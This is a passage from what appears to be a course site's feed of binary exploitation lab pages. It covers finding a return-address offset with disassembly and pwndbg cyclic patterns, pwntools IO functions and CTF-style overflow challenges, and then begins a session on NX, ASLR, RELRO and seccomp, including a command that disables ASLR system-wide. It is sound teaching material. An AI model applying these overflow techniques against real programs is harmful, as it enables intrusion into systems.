&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">esi&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x1&lt;/span> &lt;span style="color:#a40000">#&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;-&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">2&lt;/span>&lt;span style="color:#000">nd&lt;/span> &lt;span style="color:#000">argument&lt;/span> &lt;span style="color:#000">of&lt;/span> &lt;span style="color:#000">fread&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#204a87">si&lt;/span>&lt;span style="color:#000">ze&lt;/span> &lt;span style="color:#000">of&lt;/span> &lt;span style="color:#000">element&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rdi&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#204a87">rax&lt;/span> &lt;span style="color:#a40000">#&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;-&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000">st&lt;/span> &lt;span style="color:#000">argument&lt;/span> &lt;span style="color:#000">of&lt;/span> &lt;span style="color:#000">fread&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">buffer&lt;/span> &lt;span style="color:#000">address&lt;/span> &lt;span style="color:#000">saved&lt;/span> &lt;span style="color:#000">in&lt;/span> &lt;span style="color:#204a87">RAX&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">call&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1030&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#000">fread@plt&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">push&lt;/span> &lt;span style="color:#204a87">rbp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rbp&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#204a87">rsp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">add&lt;/span> &lt;span style="color:#204a87">rsp&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0xffffffffffffff80&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">#&lt;/span> &lt;span style="color:#a40000">---&lt;/span> &lt;span style="color:#204a87;font-weight:bold">import&lt;/span>&lt;span style="color:#000">ant&lt;/span> &lt;span style="color:#000">bit&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">---&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rdx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#204a87;font-weight:bold">QWORD&lt;/span> &lt;span style="color:#000">PTR&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">rip&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x2efb&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#a40000">#&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">404030&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#000">stdin@@GLIBC_2.2.5&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">lea&lt;/span> &lt;span style="color:#204a87">rax&lt;/span>&lt;span style="color:#000;font-weight:bold">,[&lt;/span>&lt;span style="color:#204a87">rbp&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x80&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#a40000">#&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;-&lt;/span> &lt;span style="color:#000">stack&lt;/span> &lt;span style="color:#000">buffer&lt;/span> &lt;span style="color:#000">starts&lt;/span> &lt;span style="color:#000">at&lt;/span> &lt;span style="color:#204a87">rbp&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x80&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rcx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#204a87">rdx&lt;/span> &lt;span style="color:#a40000">#&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;-&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">4&lt;/span>&lt;span style="color:#000">th&lt;/span> &lt;span style="color:#000">argument&lt;/span> &lt;span style="color:#000">fo&lt;/span> &lt;span style="color:#000">fread&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">stdin&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">edx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x100&lt;/span> &lt;span style="color:#a40000">#&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;-&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">3&lt;/span>&lt;span style="color:#000">rd&lt;/span> &lt;span style="color:#000">argument&lt;/span> &lt;span style="color:#000">of&lt;/span> &lt;span style="color:#000">fread&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">number&lt;/span> &lt;span style="color:#000">of&lt;/span> &lt;span style="color:#000">elements&lt;/span> &lt;span style="color:#000">read&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">esi&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x1&lt;/span> &lt;span style="color:#a40000">#&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;-&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">2&lt;/span>&lt;span style="color:#000">nd&lt;/span> &lt;span style="color:#000">argument&lt;/span> &lt;span style="color:#000">of&lt;/span> &lt;span style="color:#000">fread&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#204a87">si&lt;/span>&lt;span style="color:#000">ze&lt;/span> &lt;span style="color:#000">of&lt;/span> &lt;span style="color:#000">element&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rdi&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#204a87">rax&lt;/span> &lt;span style="color:#a40000">#&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;-&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000">st&lt;/span> &lt;span style="color:#000">argument&lt;/span> &lt;span style="color:#000">of&lt;/span> &lt;span style="color:#000">fread&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">buffer&lt;/span> &lt;span style="color:#000">address&lt;/span> &lt;span style="color:#000">saved&lt;/span> &lt;span style="color:#000">in&lt;/span> &lt;span style="color:#204a87">RAX&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">call&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">401030&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#000">fread@plt&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">#&lt;/span> &lt;span style="color:#a40000">---------------------&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">eax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">leave&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">ret&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Looking at the &lt;code>fread&lt;/code> arguments we can see the buffer start relative to &lt;code>RBP&lt;/code> and the number of bytes read. &lt;code>RBP-0x80+0x100*0x1 = RBP+0x80&lt;/code>, so the fread function can read 128 bytes after &lt;code>RBP&lt;/code> -&amp;gt; return address stored at 136 bytes after &lt;code>RBP&lt;/code>.&lt;/p>
&lt;img src="./assets/stack_buffer.png" width="600">
&lt;h4 id="dynamic-analysis">Dynamic analysis&lt;/h4>
&lt;p>You can determine offsets at runtime in a more automated way with pwndbg using an &lt;a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">De Bruijin sequences&lt;/a> which produces strings where every substring of length N appears only once in the sequence; in our case it helps us identify the offset of an exploitable memory value relative to the buffer.&lt;/p>
&lt;p>For a simple buffer overflow the worflow is:&lt;/p>
&lt;ol>
&lt;li>generate an long enough sequence to guarantee a buffer overflow&lt;/li>
&lt;li>feed the generated sequence to the input function in the program&lt;/li>
&lt;li>the program will produce a segmentation fault when reaching the invalid return address on the stack&lt;/li>
&lt;li>search the offset of the faulty address in the generated pattern to get an offset&lt;/li>
&lt;/ol>
&lt;p>In pwndbg this works as such:&lt;/p>
&lt;pre tabindex="0">&lt;code>pwndbg&amp;gt; cyclic -n 8 256
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaab
pwndbg&amp;gt; run
...
pwndbg&amp;gt;
&amp;lt;reading input, paste the generated pattern&amp;gt;
...
pwndbg&amp;gt; continue
...
Program received signal SIGSEGV, Segmentation fault
...
0x401141 &amp;lt;main+27&amp;gt; mov esi, 1
0x401146 &amp;lt;main+32&amp;gt; mov rdi, rax
0x401149 &amp;lt;main+35&amp;gt; call fread@plt &amp;lt;fread@plt
0x40114e &amp;lt;main+40&amp;gt; mov eax, 0
0x401153 &amp;lt;main+45&amp;gt; leave
► 0x401154 &amp;lt;main+46&amp;gt; ret &amp;lt;0x6161616161616172&amp;gt;
...
pwndbg&amp;gt; cyclic -n 8 -c 64 -l 0x6161616161616172
136
&lt;/code>&lt;/pre>&lt;p>&lt;em>Note: we get the same 136 offset computed manually with the static analysis method.&lt;/em>&lt;/p>
&lt;h2 id="input-output-functions">Input-Output functions&lt;/h2>
&lt;p>Most programs aren&amp;rsquo;t a straight forward single input buffer overflow so we need to deal with things like:&lt;/p>
&lt;ul>
&lt;li>automizing program input-output - by programmatically sending and receiving data&lt;/li>
&lt;li>parsing program output - to use potential leaked information&lt;/li>
&lt;li>understand the mechanics of the IO methods used - what kind of data they accept and possible constraints&lt;/li>
&lt;/ul>
&lt;p>&lt;em>Pwntools&lt;/em> offers a large area of &lt;a href="https://docs.pwntools.com/en/stable/tubes.html">IO functions&lt;/a> to communicate with a program (either local or remote).
The basic and usual ones are:&lt;/p>
&lt;ul>
&lt;li>&lt;code>send(data)&lt;/code> - sends the &lt;code>data&lt;/code> byte string to the process&lt;/li>
&lt;li>&lt;code>sendline(data)&lt;/code> - shorthand for &lt;code>send(data + b&amp;quot;\n&amp;quot;)&lt;/code>&lt;/li>
&lt;li>&lt;code>recv(num)&lt;/code> - recieves &lt;code>num&lt;/code> bytes from the process&lt;/li>
&lt;li>&lt;code>recvline()&lt;/code> - recieves a whole line from the process (until &amp;lsquo;\n&amp;rsquo;)&lt;/li>
&lt;li>&lt;code>recvuntil(str)&lt;/code> - receives data until &lt;code>str&lt;/code> is found (will not contain &lt;code>str&lt;/code>)&lt;/li>
&lt;li>&lt;code>recvall()&lt;/code> - receives the full program ouptut (until EOF)&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>Check the documentation for more complex IO functions that might come in handy (like &lt;code>recvregex&lt;/code>, &lt;code>sendafter&lt;/code>).&lt;/p>
&lt;/blockquote>
&lt;p>It is also important to understand the functionality of the different IO functions the program itself uses. For C programs, in our case, you can always
find useful information in the man pages of specific functions, TL;DR:&lt;/p>
&lt;ul>
&lt;li>&lt;code>size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)&lt;/code> - reads &lt;em>nmemb&lt;/em> items of data, each &lt;em>size&lt;/em> bytes long,
&lt;ul>
&lt;li>simple and straightforward&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;code>char *gets(char *s)&lt;/code> - reads until either a terminating newline or EOF, which it replaces with a null byte (&amp;rsquo;\0')
&lt;ul>
&lt;li>the problem here is that you won&amp;rsquo;t be able to have a newline in the middle of your payload; note that it doesn&amp;rsquo;t have a size argument to it will read indefinetely as long as it doesn&amp;rsquo;t reach a newline or EOF&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;code>char *fgets(char *s, int size, FILE *stream)&lt;/code> - reads in &lt;strong>at most&lt;/strong> one less than &lt;em>size&lt;/em> characters from stream and stores them into the buffer pointed to by s. Reading stops after an &lt;strong>EOF&lt;/strong> or a &lt;strong>newline&lt;/strong>. If a &lt;strong>newline&lt;/strong> is read, it is stored into the buffer. A terminating null byte (&amp;rsquo;\0&amp;rsquo;) is stored after the last character in the buffer.
&lt;ul>
&lt;li>this one adds the size limit argument, but also note that it &lt;strong>stores&lt;/strong> the newline in the string and &lt;strong>adds&lt;/strong> the null byte after (in contrast to &lt;code>gets&lt;/code>)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;code>int scanf(const char *format, ...)&lt;/code> - as opposed the other funcions &lt;code>scanf&lt;/code> reads &lt;strong>text&lt;/strong> based on the format string and parses it
&lt;ul>
&lt;li>don&amp;rsquo;t do the common mistake of &lt;strong>sending binary data to scanf&lt;/strong>, for example &lt;code>&amp;quot;%d&amp;quot;&lt;/code> expects a string representation of a numer like &lt;code>&amp;quot;16&amp;quot;&lt;/code>, not the binary data like &lt;code>&amp;quot;\x00\x00\x00\x10&amp;quot;&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>Every time you encounter a new input function check the documentation to find it&amp;rsquo;s limitations&lt;/p>
&lt;/blockquote>
&lt;h1 id="challenges">Challenges&lt;/h1>
&lt;h2 id="01-challenge-parrot">01. Challenge: Parrot&lt;/h2>
&lt;p>Some programs feature a stack &lt;em>smashing protection&lt;/em> in the form of stack canaries, that is, values kept on the stack which are checked before returning from a function. If the value has changed, then the “canary” can conclude that stack data has been corrupted throughout the execution of the current function.&lt;/p>
&lt;p>We have implemented our very own &lt;code>parrot&lt;/code>. Can you avoid it somehow?&lt;/p>
&lt;h2 id="02-challenge-indexing">02. Challenge: Indexing&lt;/h2>
&lt;p>More complex programs require some form of protocol or user interaction. This is where &lt;em>pwntools&lt;/em> shines.
Here&amp;rsquo;s an interactive script to get you started:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">from&lt;/span> &lt;span style="color:#000">pwn&lt;/span> &lt;span style="color:#204a87;font-weight:bold">import&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">p&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">process&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;./indexing&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">p&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">recvuntil&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;Index: &amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">p&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">sendline&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span> &lt;span style="color:#8f5902;font-style:italic"># TODO (must be string)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic"># Give value&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">p&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">recvuntil&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;Value: &amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">p&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">sendline&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span> &lt;span style="color:#8f5902;font-style:italic"># TODO (must be string)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">p&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">interactive&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>Go through GDB when aiming to solve this challenge. As all input values are strings, you can input them at the keyboard and follow their effect in GDB.&lt;/p>
&lt;/blockquote>
&lt;h2 id="03-challenge-smashthestack-level7">03. Challenge: Smashthestack Level7&lt;/h2>
&lt;p>Now you can tackle a real challenge. See if you can figure out how you can get a shell from this one.&lt;/p>
&lt;blockquote>
&lt;p>Hints:&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>There&amp;rsquo;s an integer overflow + buffer overflow in the program.&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>How does integer multiplication work at a low level? Can you get get a positive number by multiplying a negative number by 4?&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>To pass command line arguments in gdb use &lt;code>run arg1 arg2 ...&lt;/code> or &lt;code>set args arg1 arg2 ...&lt;/code> before a &lt;code>run&lt;/code> command&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>In &lt;em>pwntools&lt;/em> you can pass a list to &lt;code>process&lt;/code> (&lt;code>process(['./level07', arg1, arg2]&lt;/code>)&lt;/p>
&lt;/blockquote>
&lt;h2 id="04-challenge-neighbourly">04. Challenge: Neighbourly&lt;/h2>
&lt;p>Let&amp;rsquo;s overwrite a structure&amp;rsquo;s function pointer using a buffer overflow in its vicinity. The principle is the same.&lt;/p>
&lt;h2 id="05-challenge-input-functions">05. Challenge: Input Functions&lt;/h2>
&lt;p>On the same idea as the &lt;em>Indexing&lt;/em> challenge but much harder. Carefully check what input functions are used and parse the input accordingly.&lt;/p>
&lt;h2 id="06-challenge-bonus-birds">06. Challenge: Bonus: Birds&lt;/h2>
&lt;p>Time for a more complex challenge. Be patient and don&amp;rsquo;t speed through it.&lt;/p>
&lt;h1 id="further-reading">Further Reading&lt;/h1>
&lt;p>&lt;a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">De Bruijin sequences&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://docs.pwntools.com/en/latest/elf/elf.html">PwnTools ELF Module&lt;/a> (which internally uses &lt;a href="https://github.com/eliben/pyelftools">PyElftoools&lt;/a> and may expose such objects)&lt;/p>
&lt;p>&lt;a href="https://docs.pwntools.com/en/stable/tubes.html">PwnTools IO&lt;/a>&lt;/p></description></item><item><title>Binary:</title><link>/binary/defense-mechanisms/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/binary/defense-mechanisms/</guid><description>
&lt;h1 id="defense-mechanisms">Defense Mechanisms&lt;/h1>
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>The previous sessions (&lt;a href="../shellcodes/">Shellcodes&lt;/a> and &lt;a href="../shellcodes-advanced/">Shellcodes Advanced&lt;/a>) presented an exploitation scenario that is based on the assumption that machine instructions can be executed from &lt;strong>any&lt;/strong> memory segment belonging to the process. As you can recall from the &lt;a href="../executable-file-formats/">Executable File Formats&lt;/a> session, different sections of an ELF binary are grouped into segments which are loaded into memory when the binary is being executed. This mechanism (and some hardware support) enables 2 important protection mechanisms that will be presented in this session:&lt;/p>
&lt;ul>
&lt;li>Executable Space Protection: only certain parts of the address space exhibit the code execution right;&lt;/li>
&lt;li>Address Space Layout Randomization (ASLR): certain parts of the address space get mapped at random locations.&lt;/li>
&lt;/ul>
&lt;p>In the &lt;a href="../return-oriented-prgramming">Return Oriented Programming&lt;/a> session we discussed how the &lt;strong>PLT&lt;/strong>/&lt;strong>GOT&lt;/strong> work in relation to resolving addresses of functions from dynamically liked libraries. We also learned how to abuse this process and trigger arbitrary code execution by &lt;strong>corrupting GOT entries&lt;/strong>. We will take this exploit primitive to the next level and explore how it can be used when additional defense mechanisms are in use.&lt;/p>
&lt;p>Next, we will introduce the &lt;strong>RELRO&lt;/strong> mitigation, which is designed to preclude the overwriting of relocation sections such as the GOT.&lt;/p>
&lt;p>Another defense mechanism we will discuss is &lt;strong>seccomp&lt;/strong>, which enables applications to enforce restrictions on the system calls performed in the process and child processes, thereby creating a sandbox.&lt;/p>
&lt;p>Besides presenting these mechanisms, we are also going to take a quick look at how can we bypass them. Since these protections are ubiquitous at this time, you will have to work around them almost every time you build a binary exploit.&lt;/p>
&lt;p>&lt;strong>IMPORTANT:&lt;/strong> The tasks today are designed for 32 bit executables. Make sure you compile with the &lt;code>-m32&lt;/code> flag for &lt;code>gcc&lt;/code>. The binaries in the tasks archive are already compiled as such.&lt;/p>
&lt;h2 id="tutorials">Tutorials&lt;/h2>
&lt;p>The tutorials will showcase the tools used to inspect the defense mechanisms.&lt;/p>
&lt;h3 id="general-defense-mechanisms-check">General Defense Mechanisms Check&lt;/h3>
&lt;p>The &lt;code>checksec&lt;/code> command-line tool is a wrapper over the functionality implemented in pwntools&amp;rsquo; &lt;code>pwnlib.elf.elf&lt;/code> module.&lt;/p>
&lt;p>To get it to work in the Kali VM, you have to update pwntools to the latest version using &lt;code>pip3 install -U pwntools&lt;/code>.&lt;/p>
&lt;p>We will use this tool throughout the session to identify which defense mechanisms are enabled for a certain binary:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~/demo/nx# checksec ./no_nx
[*] &amp;#39;/root/demo/nx/no_nx&amp;#39;
Arch: i386-32-little
RELRO: Full RELRO
Stack: No canary found
NX: NX disabled
PIE: PIE enabled
RWX: Has RWX segments
&lt;/code>&lt;/pre>&lt;h3 id="executable-space-protection">Executable Space Protection&lt;/h3>
&lt;p>The &lt;code>executable space protection&lt;/code> is an instance of the &lt;code>principle of least privilege&lt;/code>, which is applied in many security sensitive domains. In this case, the executable space protection is used to limit the types of memory access that a process is allowed to make during execution. A memory region (i.e. page) can have the following protection levels: &lt;strong>READ&lt;/strong>, &lt;strong>WRITE&lt;/strong> and &lt;strong>EXECUTE&lt;/strong>. The executable space protection mechanism mandates that writable regions should not be executable at the same time. This prevents code injection.&lt;/p>
&lt;p>The mechanism can be (and was) implemented in many different ways, the most common in Linux being:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>NX bit&lt;/strong>: This is the easiest method, and involves an extra bit added to each page table entry that specifies if the memory page should be executable or not. This is the current implementation in 64-bit processors where page table entries are 8-bytes wide.&lt;/li>
&lt;li>&lt;strong>Physical Address Extension (PAE)&lt;/strong>: Besides the main feature that allows access to more than 4GB of memory, the PAE extension for 32-bit processor also adds a NX bit in its page table entries.&lt;/li>
&lt;li>&lt;strong>Emulation&lt;/strong>: The NX bit can be emulated on older (i.e., non-PAE) 32-bit processors by overloading the Supervisor bit (&lt;a href="https://en.wikipedia.org/wiki/PaX#PAGEEXEC">PaX PAGEEXEC&lt;/a>), or by using the segmentation mechanism and splitting the address space in half (&lt;a href="https://en.wikipedia.org/wiki/PaX#SEGMEXEC">PaX SEGMEXEC&lt;/a>).&lt;/li>
&lt;/ul>
&lt;p>This security feature gets in the way of &lt;strong>just-in-time (JIT)&lt;/strong> compilers, which need to produce and write code at runtime, and that is later executed. Since a JIT compiler cannot run in this kind of secured environment, an application using it is vulnerable to attacks known as &lt;strong>JIT spraying&lt;/strong>. The idea was first presented by Dion Blazakis, and is, briefly, a way to force the JIT compiler to produce shellcode.&lt;/p>
&lt;ul>
&lt;li>Slides: &lt;a href="http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf">Black Hat &amp;amp; DEF CON 2010&lt;/a>;&lt;/li>
&lt;li>Paper: &lt;a href="http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf">Interpreter Exploitation. Pointer Inference and JIT Spraying&lt;/a>.&lt;/li>
&lt;/ul>
&lt;p>There are of course other implementations in different hardening-oriented projects such as: OpenBSD &lt;a href="https://marc.info/?l=openbsd-misc&amp;amp;m=105056000801065">W^X&lt;/a>, Red Hat &lt;a href="https://marc.info/?l=openbsd-misc&amp;amp;m=105056000801065">Exec Shield&lt;/a>, PaX (which is now part of &lt;a href="https://grsecurity.net/">grsecurity&lt;/a>), Windows Data Execution Prevention (&lt;a href="https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention">DEP&lt;/a>).&lt;/p>
&lt;h3 id="memory-segments-permissions-walkthrough">Memory Segments Permissions Walkthrough&lt;/h3>
&lt;p>The Linux kernel provides support for managing memory protections using the &lt;code>mmap()&lt;/code> and &lt;code>mprotect()&lt;/code> syscalls. Simply put, what they do is:&lt;/p>
&lt;ul>
&lt;li>&lt;code>mmap()&lt;/code>: requests the OS to create a mapping (allocate space) inside the address space of the calling process. See &lt;a href="https://stackoverflow.com/questions/3642021/what-does-mmap-do">this answer&lt;/a>;&lt;/li>
&lt;li>&lt;code>mprotect()&lt;/code>: requests the OS to set permissions over a memory region (e.g. &lt;code>PROT_READ&lt;/code>, &lt;code>PROT_WRITE&lt;/code>, &lt;code>PROT_EXEC&lt;/code> and others).&lt;/li>
&lt;/ul>
&lt;p>These syscalls are used by the loader to set protection levels for each segment it loads when running a binary. Of course, the same functions can also be used during execution.&lt;/p>
&lt;p>PaX has a protection option that restricts the use of &lt;code>mprotect()&lt;/code> and &lt;code>mmap()&lt;/code> to avoid resetting the permissions during execution. See &lt;a href="https://pax.grsecurity.net/docs/mprotect.txt">MPROTECT&lt;/a>. Note that grsecurity/PaX are patches to the kernel, and are not available in normal distributions. You have to compile your own kernel if you want to try them out.&lt;/p>
&lt;p>Let&amp;rsquo;s start by deactivating ASLR, which is going to be discussed in the following section of this tutorial, and only focus on the NX protection. We can do this in two ways, as told below.&lt;/p>
&lt;ul>
&lt;li>To disable ASLR system-wide we use (root access is required): &lt;code>sudo bash -c 'echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space'&lt;/code>;&lt;/li>
&lt;li>To create a shell with ASLR disabled (ASLR will also be disabled for future processes spawned from that shell), we use (root access is not required): &lt;code>setarch $(uname -m) -R /bin/bash&lt;/code>.&lt;/li>
&lt;/ul>
&lt;p>After disabling ASLR, let&amp;rsquo;s compile an extremely simple C application. Save the following code as &lt;code>hello.c&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>int main() {
while (1);
}
